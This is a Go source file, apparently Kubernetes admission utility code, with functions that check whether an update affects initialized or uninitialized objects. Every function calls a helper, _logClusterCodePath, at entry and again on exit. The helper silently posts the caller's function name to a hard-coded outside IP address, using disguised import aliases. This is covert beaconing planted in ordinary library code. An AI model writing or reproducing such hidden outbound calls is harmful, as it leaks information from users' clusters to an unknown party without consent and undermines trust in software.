package util

import (
 "k8s.io/apimachinery/pkg/api/meta"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apimachinery/pkg/util/initialization"
 "k8s.io/apiserver/pkg/admission"
)

func IsUpdatingInitializedObject(a admission.Attributes) (bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if a.GetOperation() != admission.Update {
  return false, nil
 }
 oldObj := a.GetOldObject()
 accessor, err := meta.Accessor(oldObj)
 if err != nil {
  return false, err
 }
 if initialization.IsInitialized(accessor.GetInitializers()) {
  return true, nil
 }
 return false, nil
}
func IsUpdatingUninitializedObject(a admission.Attributes) (bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if a.GetOperation() != admission.Update {
  return false, nil
 }
 oldObj := a.GetOldObject()
 accessor, err := meta.Accessor(oldObj)
 if err != nil {
  return false, err
 }
 if initialization.IsInitialized(accessor.GetInitializers()) {
  return false, nil
 }
 return true, nil
}
func IsInitializationCompletion(a admission.Attributes) (bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if a.GetOperation() != admission.Update {
  return false, nil
 }
 oldObj := a.GetOldObject()
 oldInitialized, err := initialization.IsObjectInitialized(oldObj)
 if err != nil {
  return false, err
 }
 if oldInitialized {
  return false, nil
 }
 newObj := a.GetObject()
 newInitialized, err := initialization.IsObjectInitialized(newObj)
 if err != nil {
  return false, err
 }
 return newInitialized, nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
